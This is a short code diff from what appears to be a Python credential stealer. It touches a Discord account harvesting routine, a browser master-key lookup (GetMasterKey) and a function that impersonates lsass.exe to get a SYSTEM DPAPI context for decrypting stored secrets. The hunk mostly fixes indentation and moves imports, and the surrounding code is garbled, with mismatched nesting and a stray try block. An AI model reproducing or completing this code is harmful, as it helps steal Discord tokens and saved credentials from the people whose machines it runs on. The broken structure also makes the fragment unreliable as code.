@@ -1588,18 +1588,8 @@ Discord Account n°{str(number_discord_account)}:
         def GetMasterKey(path):
             if not os.path.exists(path):
                 return None
-                
-            try:
-        import windows
-        import windows.crypto
-        from Crypto.Cipher import AES, ChaCha20_Poly1305
-        return True
-    except ImportError:
-        return False
         
-
-
-    def _impersonate_lsass():
+        def _impersonate_lsass():
         """Impersonate lsass.exe for SYSTEM DPAPI context."""
         import windows
         import windows.generated_def as gdef
